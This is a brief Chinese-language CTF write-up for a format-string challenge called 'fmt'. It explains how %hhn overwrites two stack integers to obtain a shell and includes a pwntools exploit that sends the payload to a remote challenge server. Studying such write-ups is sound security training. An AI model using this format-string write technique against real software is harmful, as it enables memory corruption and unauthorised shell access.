# fmt

## 文件分析

保护全开  
ghidra分析为64位程序

## 解题思路

这题是要将栈上的2个int值修改成特定数字就给shell，作者已将地址放在栈上，
gdb动调格式化字符串的参数，发现这2个地址均可访问到，那么直接使用%n将数字写入即可

（我看作者还在buf上放了地址的后8位，估计我这个是非预期解吧）

## EXPLOIT

```python
from pwn import *
def payload(lo):
    global sh
    if lo:
        sh = process('./fmt')
    else:
        sh = remote('43.249.195.138', 22188)
    if lo & 0b10:
        gdb.attach(sh)

    # 第8个参数和第9个参数刚好是那2个地址，分别写入0x12和0x34即可
    # 给新手一个提醒，在同一条printf语句中，%n统计的是累计打印出的字符数
    # %hhn是将地址视为byte *向其中写入数字
    sh.sendline(b'%18d%8$hhn%34d%9$hhn')
    sh.interactive()

payload(0)
```

Done.
